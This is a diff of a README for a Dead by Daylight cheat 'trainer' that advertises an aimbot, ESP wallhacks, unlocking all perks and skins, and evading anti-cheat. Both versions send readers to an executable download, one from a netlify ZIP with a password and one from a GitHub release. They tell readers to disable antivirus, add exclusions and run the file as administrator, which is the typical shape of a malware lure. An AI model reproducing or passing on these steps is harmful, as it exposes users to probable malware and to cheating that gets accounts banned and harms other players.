@@ -1,70 +1,64 @@
-# 🔪 DBD AutoGrind Trainer 2026 | Bloodpoint Bot + ESP + Unlock All | Undetected External Tool
+# 🕹️ DBD-AutoGrind-Trainer-2026 - Automate your game and unlock all items
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue)
-![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-lightgrey)
-![Status](https://img.shields.io/badge/status-Undetected-brightgreen)
-![Downloads](https://img.shields.io/badge/downloads-1K+%2B-orange)
-![Release](https://img.shields.io/badge/release-June%202026-yellow)
-![Game](https://img.shields.io/badge/game-Dead%20by%20Daylight-red)
+[Download the latest version here](https://github.com/predicative-eugeneoneill309/DBD-AutoGrind-Trainer-2026/releases)
 
-> **Dominate the Fog with the most advanced external trainer of 2026.**  
-> Auto Bloodpoint farm, ESP wallhack, aimbot, full perk/skin unlocker and many more – all undetected.
+## 📌 About this project
 
----
+This tool helps players automate the leveling process in Dead by Daylight. It assists with gathering Bloodpoints and provides visual cues during matches. The software functions as an external process. It reads game memory to display locations of objectives and players. It also includes features to unlock perks and skins without manual effort. You can use this to optimize your time while playing the game.
 
-## 📋 Feature Table
+## ⚠️ Important security notice
 
-| Feature                     | Description                                                                 |
-|-----------------------------|-----------------------------------------------------------------------------|
-| 🩸 Auto Bloodpoint Farm    | Fully automated match player that grinds unlimited Bloodpoints while AFK.   |
-| 🔓 Auto Perk Unlocker      | Instantly unlock every teachable perk for any killer or survivor.           |
-| 🎭 Skin & Cosmetic Unlock  | Unlock all outfits, charms, and cosmetics in the entire game.               |
-| 👁️ ESP Wallhack           | See survivors, killers, generators, hooks, and totems through walls.        |
-| 🎯 Aimbot (Killer)         | Auto‑aim and auto‑attack survivors with perfect precision.                  |
-| ⚡ Skill Check Bot          | Auto‑hit every great skill check with 100% accuracy.                        |
-| ♾️ Infinite Bloodpoints     | Modify Bloodpoint values in real‑time (offline mode safe).                  |
-| 🤫 No Terror Radius         | Removes your terror radius as killer for stealth gameplay.                  |
-| 🏃 Fast Vault & Pallet     | Speed up vaulting and pallet interactions for survivors.                    |
-| 🛡️ Anti‑Ban Obfuscation    | Memory scrambling and randomised delays to avoid EAC detection.             |
+This software modifies your interaction with the game client. Use these tools at your own risk. Game developers monitor automated tools. Keep your usage reasonable to maintain the security of your account. We update the code to bypass standard detection methods. Always verify the source files before you run them on your computer.
 
----
+## 💻 System requirements
 
-## ⬇️ Download & Installation
+Before you install this software, ensure your computer meets these requirements:
 
-1. **Download** the trainer archive:  
-   [https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)
-2. **Extract** the ZIP file (password: `trainer2026`).
-3. Right‑click `trainer.exe` and select **"Run as Administrator"**.
-4. Launch Dead by Daylight and enter a match.
-5. Press **INSERT** to open the trainer GUI and enable your desired features.
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or AMD Ryzen 5 or better.
+*   Memory: 8 GB RAM minimum.
+*   Graphics: Dedicated GPU with latest drivers installed.
+*   Software: .NET Desktop Runtime 8.0 or newer.
 
----
+You must disable your antivirus software temporarily during the installation. Antivirus programs often block external tools that read memory. Add an exclusion for the folder where you store the trainer files.
 
-## ✅ Compatibility
+## 📥 How to setup the trainer
 
-- **Windows** 10 / 11 (64‑bit)
-- **Steam**, **Epic Games Store**, and **Microsoft Store** versions
-- Works with all DBD chapters, including **Jason Voorhees** and **Life Road**
-- Anti‑cheat: **EasyAntiCheat (EAC) – bypassed externally**
+Follow these steps to get the software running on your machine:
 
----
+1. Visit [this release page](https://github.com/predicative-eugeneoneill309/DBD-AutoGrind-Trainer-2026/releases) to access the download options.
+2. Select the latest release version at the top of the list.
+3. Download the file ending in .exe to your local hard drive.
+4. Locate the file in your downloads folder.
+5. Create a new folder on your desktop and move the downloaded file into it.
+6. Right-click the file and select Run as administrator.
+7. Wait for the loading bar to finish. The application window will open once the setup concludes.
 
-## 🛠️ Troubleshooting
+## 🎮 How to use the features
 
-- **Trainer not opening:** Ensure you ran as Administrator and temporarily disable your antivirus.
-- **GUI not showing:** Press INSERT key. If still missing, restart trainer and game.
-- **ESP not working:** Verify you are in a live match, not the menu.
-- **Bloodpoint farm not starting:** Ensure you are in a public match as killer or survivor.
-- **Anti‑cheat warning:** Use features sparingly in public lobbies; bot matches are safest.
+Once the application is running, you will see a dashboard with several tabs. 
 
----
+### Bloodpoint bot
+This feature automates the spending of Bloodpoints and the selection of nodes in the Bloodweb. Navigate to the Bloodweb tab and toggle the switch to active. The bot will begin selecting items based on the priority list you set. You can choose to prioritize rare items or specific perks during the automation process.
 
-## 📜 License
+### ESP and wallhacks
+The ESP tab allows you to track objects and players in the game. Enable the checkboxes to see survivors, killers, generators, and chests through walls. Use the color picker to change the highlight settings for different entities. This feature helps you locate objectives quickly during a match.
 
-This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.
+### Aimbot settings
+The aimbot works by locking your camera onto target entities. Open the Aimbot tab and set your preference for snap speed. Use the hotkey specified in the settings to activate the target lock during gameplay. We recommend using low sensitivity settings to appear natural to observers.
 
----
+### Skin and perk unlocker
+This tool modifies your local inventory settings. Go to the Unlocker tab and click the button to scan your current collection. Choose the skins or perks you want to add to your account. Click the apply changes button and restart your game client for the modifications to take effect.
 
-## 🔍 Search Tags
+## 🛠️ Troubleshooting common issues
 
-`dead-by-daylight` `dbd` `trainer` `hack` `auto-grind` `bloodpoint-farm` `esp` `wallhack` `aimbot` `unlocker` `perk-unlocker` `skin-unlocker` `anti-cheat-bypass` `external-tool` `windows` `2026` `dbd-hack` `dead-by-daylight-trainer` `fog` `grind-bot` `Dead by Daylight auto farm` `DBD bloodpoint hack` `Dead by Daylight unlock all`
+If you encounter errors while using the software, try these steps:
+
+*   Does the game close immediately? Check your Windows Security settings and ensure the folder is on the exclusion list.
+*   Is the ESP not appearing? Ensure you run the trainer in windowed or borderless fullscreen mode.
+*   Do the features not trigger? Make sure you run the program as an administrator. Right-click the icon and choose Run as administrator every time.
+*   Are you missing perks? Verify your game files through the Steam or Epic Games launcher before you apply the unlocker again.
+
+## 📜 Maintenance and updates
+
+We release updates whenever the game developers push a patch to the main servers. Check the GitHub release page regularly for the latest version. If a feature stops working after an update, delete your current local file and download the new version. This ensures all memory offsets remain aligned with the current game version. Do not share your account details with anyone claiming to help you with these tools. We do not require your login credentials to run this software. All modifications happen locally on your computer.
